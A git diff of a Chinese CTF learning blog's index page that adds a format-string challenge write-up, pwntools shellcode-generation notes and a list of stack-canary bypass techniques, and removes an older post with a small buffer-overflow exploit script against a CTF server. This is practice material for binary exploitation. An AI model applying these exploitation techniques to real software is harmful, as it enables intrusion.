@@ -121,7 +121,7 @@
   </li>
         <li class="menu-item menu-item-archives">
 
-    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives<span class="badge">24</span></a>
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives<span class="badge">25</span></a>
 
   </li>
   </ul>
@@ -225,6 +225,70 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2021/03/25/AD-string/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="带废物">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="全宇宙最蒻的博客">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2021/03/25/AD-string/" class="post-title-link" itemprop="url">AD_string</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+              
+
+              <time title="Created: 2021-03-25 16:03:12 / Modified: 19:36:40" itemprop="dateCreated datePublished" datetime="2021-03-25T16:03:12+08:00">2021-03-25</time>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <p>分析：</p>
+<p>在main()中<br>定义指针v3，malloc函数返回给v3一个地址（这里称作[0]），此时指针v3存放一个[0]，指向未知内容。<br>定义整型v5，将令v5=v3=[0]。<br>令v3指向68。<br>修改v3的下一个地址（这里称作[1]）为85。</p>
+<p>在sub_400D72(v5)中<br>参数传递int a1=v5</p>
+<p>在sub_400CA6(a1)中<br>参数传递新变量，指针a1（局部函数同名）存放a1，即存放[0]，指向68</p>
+<p>因为指针a1与指针v3存放同一个地址，所以a1就是v3，故<strong>*a1</strong>=68，a1[1]=85。<br>题目要求使<strong>*a1</strong>等于a1[1]，这里选择将<strong>*a1</strong>更改为85。</p>
+<p>主要思路：利用printf格式化字符串漏洞，算出修改地址[0]所需要的偏移量。再利用一遍，往[0]写入68。最后用shellcode拿到flag。</p>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
     <link itemprop="mainEntityOfPage" href="http://example.com/2021/03/24/Nep-1/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -248,10 +312,16 @@
                 <i class="far fa-calendar"></i>
               </span>
               <span class="post-meta-item-text">Posted on</span>
-              
 
-              <time title="Created: 2021-03-24 15:50:52 / Modified: 21:40:01" itemprop="dateCreated datePublished" datetime="2021-03-24T15:50:52+08:00">2021-03-24</time>
+              <time title="Created: 2021-03-24 15:50:52" itemprop="dateCreated datePublished" datetime="2021-03-24T15:50:52+08:00">2021-03-24</time>
             </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">Edited on</span>
+                <time title="Modified: 2021-03-25 16:03:31" itemprop="dateModified" datetime="2021-03-25T16:03:31+08:00">2021-03-25</time>
+              </span>
 
           
 
@@ -889,7 +959,7 @@
                   <i class="far fa-calendar-check"></i>
                 </span>
                 <span class="post-meta-item-text">Edited on</span>
-                <time title="Modified: 2021-03-09 15:58:55" itemprop="dateModified" datetime="2021-03-09T15:58:55+08:00">2021-03-09</time>
+                <time title="Modified: 2021-03-25 17:45:50" itemprop="dateModified" datetime="2021-03-25T17:45:50+08:00">2021-03-25</time>
               </span>
 
           
@@ -915,6 +985,12 @@
 <p><strong>IO模块</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">sh.send(data)  发送数据</span><br><span class="line">sh.sendline(data)  发送一行数据，相当于在数据后面加\n</span><br><span class="line">sh.recv(numb &#x3D; 2048, timeout &#x3D; dufault)  接受数据，numb指定接收的字节，timeout指定超时</span><br><span class="line">sh.recvline(keepends&#x3D;True)  接受一行数据，keepends为是否保留行尾的\n</span><br><span class="line">sh.recvuntil(&quot;Hello,World\n&quot;,drop&#x3D;fasle)  接受数据直到我们设置的标志出现</span><br><span class="line">sh.recvall()  一直接收直到EOF</span><br><span class="line">sh.recvrepeat(timeout &#x3D; default)  持续接受直到EOF或timeout</span><br><span class="line">sh.interactive()  直接进行交互，相当于回到shell的模式，在取得shell之后使用</span><br></pre></td></tr></table></figure></p>
 <p><strong>ELF文件操作</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; e &#x3D; ELF(&#39;&#x2F;bin&#x2F;cat&#39;)</span><br><span class="line">&gt;&gt;&gt; print hex(e.address)  # 文件装载的基地址</span><br><span class="line">0x400000</span><br><span class="line">&gt;&gt;&gt; print hex(e.symbols[&#39;write&#39;]) # 函数地址</span><br><span class="line">0x401680</span><br><span class="line">&gt;&gt;&gt; print hex(e.got[&#39;write&#39;]) # GOT表的地址</span><br><span class="line">0x60b070</span><br><span class="line">&gt;&gt;&gt; print hex(e.plt[&#39;write&#39;]) # PLT的地址</span><br><span class="line">0x401680</span><br><span class="line">&gt;&gt;&gt; print hex(e.search(&#39;&#x2F;bin&#x2F;sh&#39;).next())# 字符串&#x2F;bin&#x2F;sh的地址</span><br></pre></td></tr></table></figure></p>
 <p><strong>整数pack与数据unpack</strong><br>pack：p32，p64<br>unpack：u32，u64<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">elf &#x3D; ELF(&#39;.&#x2F;a&#39;)</span><br><span class="line">b &#x3D; elf.symbols[&#39;system&#39;]</span><br><span class="line">payload &#x3D; &#39;a&#39; * (0x80 + 0x8) + p64(b)</span><br><span class="line">...	</span><br></pre></td></tr></table></figure><br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">io.p32()</span><br><span class="line">io.p64(<span class="number">0xdeadbeefdeadbeef</span>)</span><br><span class="line">io.u32(<span class="string">&quot;1234&quot;</span>)</span><br><span class="line">io.u64(<span class="string">&quot;12345678&quot;</span>)</span><br><span class="line"><span class="comment"># 将字节数组与数组进行以小端对齐的方式相互转化，32负责转化dword，64负责转化qword</span></span><br></pre></td></tr></table></figure></p>
+<p><strong>PWN-shellcode</strong></p>
+<p>当我们在获得程序的漏洞后，就可以在程序的漏洞处执行特定的代码，而这些代码也就是俗称的shellcode。（以下为获取pwntools内置集成）</p>
+<p>（1）先设置目标机的参数<br>context(os=’linux’, arch=’amd64’, log_level=’debug’)</p>
+<p>os设置系统为linux系统，在完成ctf题目的时候，大多数pwn题目的系统都是linux<br>arch设置架构为amd64，可以简单的认为设置为64位的模式，对应的32位模式是’i386’<br>log_level设置日志输出的等级为debug，这句话在调试的时候一般会设置，这样pwntools会将完整的io过程都打印下来，使得调试更加方便，可以避免在完成CTF题目时出现一些和IO相关的错误。</p>
+<p>（2）获取shellcode<br>获得执行system(“/bin/sh”)汇编代码所对应的机器码<br>asm(shellcraft.sh())<br>具体利用如下：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">context(log_level = <span class="string">&#x27;debug&#x27;</span>, arch = <span class="string">&#x27;i386&#x27;</span>, os = <span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line">shellcode=asm(shellcraft.sh())</span><br></pre></td></tr></table></figure>
 <h1 id="IDA"><a href="#IDA" class="headerlink" title="IDA"></a>IDA</h1><p>新建选GO<br>将文件拖入<br><img src="/2020/12/19/pwn%E7%94%A8%E5%88%B0%E7%9A%84%E5%B7%A5%E5%85%B7%E6%B1%87%E6%80%BB/1.png" class><br>得到汇编码</p>
 <p>找到入口点F5得到伪C代码（也许能看得懂）<br>shift+F12找出字符串（带””的内容，可能有重要内容）<br>双击函数、变量跳出所在位置</p>
 <p>菜单工具栏中View Toolbars下有两个子菜单，分别时Basci mode 和 Advanced mode<br>逆向工作区一般有7个子窗口：<br> IDA View-A 反汇编试图A<br> Hex View-A 16进制试图A<br> Functions Window 函数窗口<br> Structures 结构体<br> Enums 枚举<br> Imports 导入数据<br> Exports 导出数据</p>
@@ -924,136 +1000,21 @@
 <p>IDA解析数据和代码之间的转换<br>很多程序为了防止被破解，加入了花指令。所谓花指令，是在代码中插入了数据使得反汇编引擎错误的将数据解析成为代码，因此从错误解析的位置开始往后的汇编代码都会被错误的解析。它是一种常用的对抗静态分析的手段。<br>如果逆向者发现IDA错误地将代码解析成为了数据或者错误地将数据解析成为了代码，可以通过快捷键“C”和快捷键“D”，在数据和代码之间解析。</p>
 <p>int_64分为两种储存方式（存进内存）<br>大端存储<br>ABCDEFG<br>小端存储<br>GFEDCBA</p>
 <p>遇到大数据+0LL后缀可能是没被转化的原进制数，因为花指令的干扰。<br>选中数据按R键转化</p>
-<h1 id="checksec"><a href="#checksec" class="headerlink" title="checksec"></a>checksec</h1><p><strong>checksec：</strong><br>checksec是一个脚本软件，也就是用脚本写的一个文件，不到2000行，可用来学习shell。<br>checksec是用来检查可执行文件属性，例如PIE, RELRO, PaX, Canaries, ASLR, Fortify Source等等属性。<br>checksec的使用方法：<br>checksec –file /usr/sbin/sshd</p>
+<h1 id="checksec"><a href="#checksec" class="headerlink" title="checksec"></a>checksec</h1><p>checksec是一个脚本软件，也就是用脚本写的一个文件，不到2000行，可用来学习shell。<br>checksec是用来检查可执行文件属性，例如PIE, RELRO, PaX, Canaries, ASLR, Fortify Source等等属性。<br>checksec的使用方法：<br>checksec –file /usr/sbin/sshd</p>
 <img src="/2020/12/19/pwn%E7%94%A8%E5%88%B0%E7%9A%84%E5%B7%A5%E5%85%B7%E6%B1%87%E6%80%BB/3.png" class>
 <p>（这张是我在网上随便找的）</p>
-<p><strong>Arch</strong><br>程序架构信息，判断是64位还是32位，exp编写的时候是p64还是p32</p>
-<p><strong>RELRO</strong><br>Relocation Read-Onl（RELRO）此项技术主要针对GOT改写的攻击方式，它分成两种，Partial RELRO和FULL RELRO<br>Partial RELRO容易受到攻击，例如攻击者可以atoi.got为system.plt进而输入/bin/sh\x00获得shell，<br>Full RELRO使整个GOT只读，从而无法被覆盖，但这样会大大增加程序的启动时间，因为程序在启动之前需要解析所有的符号。</p>
-<p><strong>Stack-canary</strong><br>栈溢出保护是一种缓冲区溢出攻击缓解手段，当函数存在缓冲区溢出攻击漏洞是，攻击者可以覆盖栈上的返回地址来让shellcode能够得到执行，当启用栈保护后，函数开始执行的时候先会往栈里插入类似cookie信息，当函数真正返回的时候会验证cookie信息是否合法，如果不合法就停止程序运行，攻击者在覆盖返回地址的时候往往会将cookie信息给覆盖掉，导致栈保护检车失败而阻止shellcode的执行，在linux中我们将cookie信息称为canary。因此我们需要获取 Canary 的值，或者防止触发 stack_chk_fail 函数，或是利用此函数。</p>
-<p><strong>NX</strong><br>Non-Executable Memory，不可执行内存。了解 Linux 的都知道其文件有三种属性，即 rwx，而 NX 即没有 x 属性。如果没有 w 属性，我们就不能向内存单元中写入数据，如果没有 x 属性，写入的 shellcode 就无法执行。所以，我们此时应该使用其他方法来 pwn 掉程序，其中最常见的方法为 ROP (Return-Oriented Programming 返回导向编程)，利用栈溢出在栈上布置地址，每个内存地址对应一个 gadget，利用 ret 等指令进行衔接来执行某项功能，最终达到 pwn 掉程序的目的。<br>NX enabled如果这个保护开启就是意味着栈中数据没有执行权限，如此一来，当攻击者在堆栈上部署自己的shellcode并触发时，智慧直接造成程序的崩溃，但是可以利用rop这种方法绕过</p>
-<p><strong>PIE</strong><br>PTE（Position-Independent  Executable，位置无关可执行文件）技术与ASLR技术类似，ASLR将程序运行时的堆栈以及共享库的加载地址随机化，而PIE及时则在编译时将程序编译为位置无关，即程序运行时各个段（如代码但等）加载的虚拟地址也是在装载时才确定，这就意味着。在PIE和ASLR同时开启的情况下，攻击者将对程序的内存布局一无所知，传统改写GOT表项也难以进行，因为攻击者不能获得程序的.got段的虚地址。若开始一般需在攻击时歇够地址信息</p>
+<h2 id="Arch"><a href="#Arch" class="headerlink" title="Arch"></a>Arch</h2><p>程序架构信息，判断是64位还是32位，exp编写的时候是p64还是p32</p>
+<h2 id="RELRO"><a href="#RELRO" class="headerlink" title="RELRO"></a>RELRO</h2><p>Relocation Read-Onl（RELRO）此项技术主要针对GOT改写的攻击方式，它分成两种，Partial RELRO和FULL RELRO<br>Partial RELRO容易受到攻击，例如攻击者可以atoi.got为system.plt进而输入/bin/sh\x00获得shell，<br>Full RELRO使整个GOT只读，从而无法被覆盖，但这样会大大增加程序的启动时间，因为程序在启动之前需要解析所有的符号。</p>
+<h2 id="Stack-canary"><a href="#Stack-canary" class="headerlink" title="Stack-canary"></a>Stack-canary</h2><p>栈溢出保护是一种缓冲区溢出攻击缓解手段，当函数存在缓冲区溢出攻击漏洞是，攻击者可以覆盖栈上的返回地址来让shellcode能够得到执行，当启用栈保护后，函数开始执行的时候先会往栈里插入类似cookie信息，当函数真正返回的时候会验证cookie信息是否合法，如果不合法就停止程序运行，攻击者在<strong>覆盖返回地址</strong>的时候往往会将cookie信息给覆盖掉，导致栈保护检车失败而阻止shellcode的执行，在linux中我们将cookie信息称为canary。因此我们需要获取 Canary 的值，或者防止触发 stack_chk_fail 函数，或是利用此函数。</p>
+<p>canary保存在栈的某个位置上，一般来说64位的话会在rbp-0x8的位置，32位则在ebp-0x4的位置。当我们进行栈溢出的时候如果覆盖了canary值，程序就会调用stack_chk_fail来打印报错信息。</p>
+<p><strong>通常有以下几种绕过方法：</strong></p>
+<p>1、通过read函数泄露canary。关键的一点就是read函数读取字符串的时候不会在末尾加上“\x00”,这就是gets函数不能用来泄露canary的原因（有些输出函数遇到‘\0’会截断）。</p>
+<p>2、暴力破解canary。这种方法利用起来有限制，就是一般要程序中有fork函数创造出子进程，因为子进程是父进程复制出来的，所以canary也就跟父进程相同，在子进程中覆盖canary后报错就会退回到父进程，此时canary的值是不会改变的。</p>
+<p>3、劫持stack_chk_fail。因为canary被覆盖的时候会调用这个函数，所以如果我们可以利用程序中的漏洞（比如格式化字符串）改got表中stack_chk_fail的地址为one_gadget的地址就能getshell。</p>
+<p>4、利用stack_chk_fail的报错信息。在报错信息中，会将你发生栈溢出的程序名调用输出，其位置位于argv[0]，我们可以将argv[0]的地址改写为我们想要获取的内容的地址，使它随着错误提示一起输出。</p>
+<h2 id="NX"><a href="#NX" class="headerlink" title="NX"></a>NX</h2><p>Non-Executable Memory，不可执行内存。了解 Linux 的都知道其文件有三种属性，即 rwx，而 NX 即没有 x 属性。如果没有 w 属性，我们就不能向内存单元中写入数据，如果没有 x 属性，写入的 shellcode 就无法执行。所以，我们此时应该使用其他方法来 pwn 掉程序，其中最常见的方法为 ROP (Return-Oriented Programming 返回导向编程)，利用栈溢出在栈上布置地址，每个内存地址对应一个 gadget，利用 ret 等指令进行衔接来执行某项功能，最终达到 pwn 掉程序的目的。<br>NX enabled如果这个保护开启就是意味着栈中数据没有执行权限，如此一来，当攻击者在堆栈上部署自己的shellcode并触发时，智慧直接造成程序的崩溃，但是可以利用rop这种方法绕过</p>
+<h2 id="PIE"><a href="#PIE" class="headerlink" title="PIE"></a>PIE</h2><p>PTE（Position-Independent  Executable，位置无关可执行文件）技术与ASLR技术类似，ASLR将程序运行时的堆栈以及共享库的加载地址随机化，而PIE及时则在编译时将程序编译为位置无关，即程序运行时各个段（如代码但等）加载的虚拟地址也是在装载时才确定，这就意味着。在PIE和ASLR同时开启的情况下，攻击者将对程序的内存布局一无所知，传统改写GOT表项也难以进行，因为攻击者不能获得程序的.got段的虚地址。若开始一般需在攻击时歇够地址信息</p>
 <h1 id="gdb"><a href="#gdb" class="headerlink" title="gdb"></a>gdb</h1>
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
-    <link itemprop="mainEntityOfPage" href="http://example.com/2020/12/18/AD-hello-pwn/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="带废物">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="全宇宙最蒻的博客">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2020/12/18/AD-hello-pwn/" class="post-title-link" itemprop="url">AD_hello_pwn</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">Posted on</span>
-
-              <time title="Created: 2020-12-18 18:54:01" itemprop="dateCreated datePublished" datetime="2020-12-18T18:54:01+08:00">2020-12-18</time>
-            </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="far fa-calendar-check"></i>
-                </span>
-                <span class="post-meta-item-text">Edited on</span>
-                <time title="Modified: 2021-03-14 10:33:48" itemprop="dateModified" datetime="2021-03-14T10:33:48+08:00">2021-03-14</time>
-              </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <img src="/2020/12/18/AD-hello-pwn/1.jpg" class>
-<p>诶呀。。。。。。<br>没人告诉我pwntools是用python写的，我看到题解有python语法就先去学python语法，看半天找不到我要的，因为用法在pwntools里。<br>诶呀，恶心啊。。。。</p>
-<h1 id="Pwntools主要模块及其使用"><a href="#Pwntools主要模块及其使用" class="headerlink" title="Pwntools主要模块及其使用"></a>Pwntools主要模块及其使用</h1><p><strong>Tubes模块包含remote和process子模块</strong></p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">io = remote(<span class="string">&quot;127.0.0.1&quot;</span>, <span class="number">32152</span>)</span><br><span class="line"><span class="comment"># 与互联网主机交互</span></span><br><span class="line">io.sendline(<span class="string">&quot;hello&quot;</span>)</span><br><span class="line">io.send(<span class="string">&quot;hello&quot;</span>)</span><br><span class="line"><span class="comment"># sendline发送数据会在最后多添加一个回车</span></span><br><span class="line">io.recv(<span class="number">1024</span>)</span><br><span class="line">io.recvuntil(<span class="string">&quot;hello&quot;</span>)</span><br><span class="line">io.recvline()</span><br><span class="line"><span class="comment"># recv()读取1024个字节，revuntil()读取到指定数据，recvline()会读取一直到回车</span></span><br><span class="line">io.interactive() <span class="comment">#爷不晓得</span></span><br></pre></td></tr></table></figure>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">io = process(<span class="string">&quot;./bin&quot;</span>, shell=<span class="literal">True</span>)</span><br><span class="line"><span class="comment">#启动本地程序进行交互，用于gdb调试</span></span><br></pre></td></tr></table></figure>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">io.p32(<span class="number">0xdeadbeef</span>)</span><br><span class="line">io.p64(<span class="number">0xdeadbeefdeadbeef</span>)</span><br><span class="line">io.u32(<span class="string">&quot;1234&quot;</span>)</span><br><span class="line">io.u64(<span class="string">&quot;12345678&quot;</span>)</span><br><span class="line"><span class="comment"># 将字节数组与数组进行以小端对齐的方式相互转化，32负责转化dword，64负责转化qword</span></span><br></pre></td></tr></table></figure>
-<p>之前昨天速成python是在本机VS2019（我现在还没找到解释器），现在去VMLinux写。</p>
-<p>太懒了，不下IDE了</p>
-<p><strong>新建文件</strong></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&gt; text.py</span><br></pre></td></tr></table></figure>
-<p>右键修改权限后可执行</p>
-<h1 id="做题"><a href="#做题" class="headerlink" title="做题"></a>做题</h1><p>本题附件用于反编译，查找漏洞，然后写脚本，用脚本连接对准环境直接攻击（我拿着脚本对附件打了半天）</p>
-<img src="/2020/12/18/AD-hello-pwn/3.jpg" class>
-<p>把附件先扔到IDA反编译</p>
-<img src="/2020/12/18/AD-hello-pwn/2.png" class>
-<p>你要是不晓得这是啥玩意，巧了，我也不知道</p>
-<p>写脚本</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *  <span class="comment">#导入pwntools的工具，我一开始在导入附件，别骂了</span></span><br><span class="line">io=remote(<span class="string">&#x27;220.249.52.134&#x27;</span>,<span class="number">41392</span>) <span class="comment">#连接环境</span></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">4</span>+p64(<span class="number">1853186401</span>)</span><br><span class="line">io.recvuntil(<span class="string">&quot;bof&quot;</span>) <span class="comment">#读取到指定数据</span></span><br><span class="line">io.sendline(payload) <span class="comment">#发送数据</span></span><br><span class="line">io.interactive() <span class="comment">#爷不懂得</span></span><br></pre></td></tr></table></figure>
-<p>运行脚本，成功</p>
-<p><strong>爷太菜了，爷滚去看汇编了</strong></p>
-<p><strong>······</strong></p>
-<p><strong>一目十行速成汇编，我胡汉三又回来了</strong></p>
-<p>附件扔IDA，找到main得到一个结构</p>
-<img src="/2020/12/18/AD-hello-pwn/1.png" class>
-<p>反汇编得到一段伪c代码</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall main(__int64 a1, char **a2, char **a3)</span><br><span class="line">&#123;</span><br><span class="line">  alarm(0x3Cu);</span><br><span class="line">  setbuf(stdout, 0LL);</span><br><span class="line">  puts(&quot;~~ welcome to ctf ~~     &quot;);</span><br><span class="line">  puts(&quot;lets get helloworld for bof&quot;);</span><br><span class="line">  read(0, &amp;unk_601068, 0x10uLL);</span><br><span class="line">  if ( dword_60106C &#x3D;&#x3D; 1853186401 )</span><br><span class="line">    sub_400686();</span><br><span class="line">  return 0LL;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>代码里面有read函数，上网去找C语言read()函数的用法</p>
-<p>从文件中读取指定大小的字节函数read()</p>
-<p>原型：<code>ssize_t read(int fd,void*buf,size_t count)</code><br>参数说明：<br>fd:   是文件描述符，对应0<br>buf:   为读出数据的缓冲区<br>count:  为每次读取的字节数（是请求读取的字节数，读上来的数据保存在缓冲区buf中，同时文件的当前读写位置向后移）<br>总结：read函数从指定的打开的文件fd中读取指定大小count的字节到从buf开始的缓冲区中。</p>
-<p>返回值:<br>若读取失败则返回-1。<br>读取成功则返回实际读取到的字节数,有两种情况:<br> [1].读取到的字节数小于count,这是在读取的文件的总字节数小于count。<br> [2].若读取到的字节数等于count,则在读取的文件的总字节数不小于count时发生。<br>注意:读取到的字节存放在buf缓冲区中,必须最后加上一个字节’\0’才能组成一个字符串</p>
-<p>回到题目<br>第一个参数为0，代表标准输入即从终端输入，第三个参数是输入的个数是0x10（uLL是unsigned long long），即16个字节。<br>将数据读到&amp;unk_601068（我猜）</p>
-<p>双击&amp;unk_601068和dword_60106C，IDA跳转到另一页面（IDA开始香了）<br><img src="/2020/12/18/AD-hello-pwn/4.png" class></p>
-<p>双击sub_400686()，跳转到：<br><img src="/2020/12/18/AD-hello-pwn/5.png" class><br>芜湖起飞</p>
-<p>也就是说只要dword_60106C=1853186401，就能拿到flag</p>
-<p>现在再看脚本了<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *  </span><br><span class="line">io=remote(<span class="string">&#x27;220.249.52.134&#x27;</span>,<span class="number">41392</span>) <span class="comment">#连接环境</span></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">4</span>+p64(<span class="number">1853186401</span>) <span class="comment">#&#x27;a&#x27;*4代表偏移四个字节，p64()是pwntools工具，打包数据，64位</span></span><br><span class="line">io.recvuntil(<span class="string">&quot;lets get hello world for bof&quot;</span>) <span class="comment">#读取代码直到这个位置</span></span><br><span class="line">io.sendline(payload) </span><br><span class="line"><span class="comment">#发送数据，写入到&amp;unk_601068，但我的数据使它偏移了4个字节，到了dword_60106C，写入数据</span></span><br><span class="line">io.interactive() <span class="comment">#将控制权交给用户</span></span><br></pre></td></tr></table></figure></p>
-<p>没有人比我更懂速成</p>
-<h1 id="IDA反编译汇编源代码复盘"><a href="#IDA反编译汇编源代码复盘" class="headerlink" title="IDA反编译汇编源代码复盘"></a>IDA反编译汇编源代码复盘</h1><p><strong>start 先于 main</strong></p>
-<p><strong>段寄存器说明语句</strong><br>在汇编语言源程序中可以定义多个段，每个段都要与一个段寄存器建立一种对应关系。建立这种对应关系的说明语句格式如下：</p>
-<p>assume 段寄存器名:段名[, 段寄存器名:段名, ……]</p>
-<p>其中：段寄存器是CS、DS、ES、SS、FS和GS，段名是在段定义语句说明时的段名。</p>
-<p>在一条assume语句中可建立多组段寄存器与段之间的关系，每种对应关系要用逗号分隔。例如，</p>
-<p>assume CS:code1, DS:data1</p>
-<p>上面的语句说明了：CS对应于代码段code1，DS对应于数据段data1。</p>
-<p>在assume语句中，还可以用关键字nothing来说明某个段寄存器不与任何段相对应。下面语句说明了段寄存器ES不与某段相对应。</p>
-<p>assume ES:nothing</p>
-<p>在通常情况下，代码段的第一条语句就是用assume语句来说明段寄存器与段之间的对应关系。在代码段的其它位置，还可以用另一个assume语句来改变前面assume语句所说明的对应关系，这样，代码段中的指令就用最近的assume语句所建立的对应关系来确定指令中的有关信息。</p>
-<p><strong>跨段寻址</strong><br>偶尔需要存取默认段以外的操作数，就要使用操作数段前缀。如，<br>mov ax,es:[si]<br>这条指令告诉cpu：要读取的数据不在当前数据段，而在附加段的si所指的地址。</p>
-<p><strong>segment</strong></p>
-<p>[格式]<br>segment_name SEGMENT [定位类型] [组合类型] [类别名]<br>···;here is your code<br>segment ends</p>
-<p>参数解释:</p>
-<p>[定位类型]<br>指明段开始的边界，如para，它使段定位在小段的边界，段首地址正好能被16整除，定位类型未指定时默认为para<br>段的定位类型有4种，分别是：<br>  page(页起始)，起始地址以00H结尾，能被256整除<br>  para (节起始)，起始地址以0H结尾，能被16整除<br>  word(字起始)，起始地址末位为0，是偶地址<br>  byte (字节起始)，起始地址为任意边界</p>
-<p>[组合类型]<br>决定本段是否要和其他段组合在一起，组合类型有：stack，common，public</p>
-<p>[类别名]<br>连接时用于相关段组合在一起，如代码段’code’，数据段’Data’，堆栈段’Stack’</p>
-<p>例子: stack segment para stack ‘stack’<br>解释: para表明该段起始地址对齐到para。 1 para= 16 bytes。stack声明该段是堆栈段，这样在最后的链接link时，会将该最终创建的exe文件头部的SS：SP域指向该段的末尾<br>‘stack’表明该段的组合名为’stack’。同一程序不同模块中，相同组合名的段会组合到一起。组合名也决定了最后exe文件中各个段的排列顺序</p>
-<p><strong>hlt</strong><br>HLT是暂停指令，当计算机程序运行一条HLT指令的时候，处理器就会进入传统的暂停模式。bai部的时钟信号停止下来了。在收到中断指令后，处理器又可以回到正常运作形态，同时时钟信号也恢复正常。 </p>
-<p><strong>栈堆相关寄存器</strong><br>运行时堆栈是内存数组，CPU用ESP寄存器（堆栈指针寄存器），对其进行管理。<br>ESP存放的是堆栈中某个位置的32位偏移量，每个堆栈位置都是32位长。<br>对应64位下的rsp（低位为esp）</p>
